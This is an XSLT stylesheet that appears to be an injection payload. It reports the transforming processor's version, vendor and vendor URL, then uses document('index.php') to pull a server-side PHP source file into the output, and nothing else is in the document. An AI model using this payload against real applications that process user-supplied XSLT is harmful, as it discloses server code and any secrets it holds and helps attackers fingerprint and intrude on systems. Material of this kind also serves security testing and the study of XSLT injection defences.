<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="text"/>
<xsl:template match="/">
Version : <xsl:value-of select="system-property('xsl:version')" />
Vendor : <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL : <xsl:value-of select="system-property('xsl:vendor-url')" />
File : <xsl:value-of select="document('index.php')"/>
</xsl:template>
</xsl:stylesheet>
